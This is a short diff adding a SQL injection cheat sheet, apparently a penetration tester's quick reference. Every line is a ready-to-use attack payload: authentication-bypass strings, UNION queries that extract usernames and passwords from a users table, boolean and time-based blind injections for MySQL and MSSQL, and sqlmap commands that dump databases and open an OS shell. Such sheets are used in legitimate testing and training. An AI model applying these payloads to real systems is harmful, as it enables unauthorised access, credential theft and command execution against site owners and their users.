@@ -1,0 +1,15 @@
+SQLi — QUICK REF
+
+Requires: user input concatenated into a SQL query (param, form, header, JSON)
+
+1.  Find:          <param>='   → SQL error   |   1' AND '1'='1  vs  1' AND '1'='2
+2.  Auth bypass:   admin'-- -   |   ' OR '1'='1'-- -
+3.  UNION (printed data):
+      1' ORDER BY N-- -                 (column count)
+      -1' UNION SELECT 1,2,3-- -        (which columns print)
+      -1' UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -
+4.  Blind:
+      bool  1' AND SUBSTRING(version(),1,1)='8'-- -
+      time  1' AND IF(1=1,SLEEP(5),0)-- -   |  ; WAITFOR DELAY '0:0:5'-- -  (MSSQL)
+5.  sqlmap:  sqlmap -r req.txt --batch --dbs / -D db -T users --dump / --os-shell
+Per-DBMS syntax → sqli-syntax sheet.
